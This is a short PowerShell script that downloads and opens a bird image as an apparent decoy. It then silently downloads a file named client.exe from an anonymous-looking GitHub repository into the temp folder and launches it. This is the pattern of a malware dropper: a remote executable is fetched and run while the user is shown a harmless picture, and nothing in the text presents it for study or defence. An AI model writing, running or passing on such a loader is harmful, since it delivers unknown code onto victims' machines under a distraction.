try {
    # Download the image
    Invoke-WebRequest -Uri "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg" -OutFile "$env:TEMP\blue-bird.jpg"

    # Open the downloaded image
    Start-Process "$env:TEMP\blue-bird.jpg"

    # Download the client.exe file
    $exeUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/client.exe"
    $exePath = "$env:TEMP\client.exe"
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

    # Run the downloaded client.exe
    Start-Process $exePath -ErrorAction Stop
    Write-Host "client.exe launched successfully."

    # Show success message box
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("Script executed successfully!", "Success", "OK", "Information")
} catch {
    Write-Host "An error occurred: $_"

    # Show error message box
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("An error occurred: $_", "Error", "OK", "Error")
}